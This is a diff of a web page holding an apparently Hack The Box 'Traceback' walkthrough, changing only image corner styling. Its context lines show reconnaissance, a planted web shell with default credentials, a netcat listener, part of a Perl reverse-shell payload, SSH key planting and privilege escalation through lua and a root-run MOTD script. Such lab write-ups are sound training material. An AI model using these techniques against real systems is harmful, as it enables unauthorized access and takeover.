@@ -136,17 +136,17 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <li>-p-: run on all ports</li>
 </ul>
 
-  <img src="/htb/traceback/nmap.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/nmap.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>We have a web page on port 80:</p>
 
-  <img src="/htb/traceback/port80.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/port80.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>There is no <code>robots.txt</code> , but there is a comment that might be useful.</p>
 
-  <img src="/htb/traceback/comment.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/comment.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>I’ll also ran gobuster:</p>
@@ -156,28 +156,28 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <h2 id="getting-user">Getting user<a class="anchor" href="#getting-user">#</a></h2>
 <p>We can assume the hacker left in a shell by that comment. We can google that comment and find a repo containing some web shells.</p>
 
-  <img src="/htb/traceback/gitrepo.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/gitrepo.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>I tried opening all off then on 10.10.10.181/&lt;shell.php&gt; , I only got a login prompt for smevk.php.</p>
 <h3 id="smevkphp">Smevk.php<a class="anchor" href="#smevkphp">#</a></h3>
 
-  <img src="/htb/traceback/smevk.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/smevk.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>Let&rsquo;s open that</p>
 
-  <img src="/htb/traceback/smevk2.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/smevk2.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>I got in with <code>admin:admin</code>.</p>
 
-  <img src="/htb/traceback/smevk3.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/smevk3.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>We have entered the system and we are webadmin now,</p>
 
-  <img src="/htb/traceback/smevk4.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/smevk4.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>now we should try to get a reverse shell so we can try to escalate privileges to user.</p>
@@ -187,7 +187,7 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <pre><code>sudo nc -lvnp 1233 
 </code></pre>
 
-  <img src="/htb/traceback/nc.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/nc.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>On backdoor webpage execute the payload but make sure to edit the IP and port.</p>
@@ -202,12 +202,12 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 };'
 </code></pre>
 
-  <img src="/htb/traceback/nc2.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/nc2.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>After executing that command we will get a sh shell as webmin:</p>
 
-  <img src="/htb/traceback/nc3.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/nc3.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>We can cat /etc/passwd and see that we have to get into the sysadmin account.</p>
@@ -243,13 +243,13 @@ cat id_rsa.pub &gt;&gt; authorized_keys
 </code></pre>
 <p>We can ssh into the box now.</p>
 
-  <img src="/htb/traceback/nc4.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/nc4.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <h3 id="enumeration">Enumeration<a class="anchor" href="#enumeration">#</a></h3>
 <p>Grab linPEAS.sh and LinEnum.sh and create a new folder with an http server running, on your local machine.</p>
 
-  <img src="/htb/traceback/python.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/python.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>After this we can grab the files and run them on the server. I created a /tmp/ajdin and pulled these files with wget :</p>
@@ -276,13 +276,13 @@ echo &quot;\nWelcome to Xh4H land \n&quot;
 </code></pre>
 <p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
 
-  <img src="/htb/traceback/ssh.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/ssh.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>So can we get code execution here as root? Let’s first get sysadmin account so we can write to this file. We are left with SUID binary which has no entry in GTFOBin, but we can Google and see what it does.</p>
 <h3 id="luvit-privilege-escalation">Luvit privilege escalation<a class="anchor" href="#luvit-privilege-escalation">#</a></h3>
 
-  <img src="/htb/traceback/luvit.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/luvit.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>Wait so it has to do something with lua? If we check lua on GTFOBin, we can spawn a shell and escalate privileges:</p>
@@ -303,7 +303,7 @@ addd2ba938b3b4bf2e15374f413aee04
 <pre><code>$ echo “whoami” &gt;&gt; 00-header
 </code></pre>
 
-  <img src="/htb/traceback/root.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+  <img src="/htb/traceback/root.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>For some reason you can’t make your ssh keys for this user. Anyway, we’ll insert the reverse shell bash payload into the 00-header .</p>
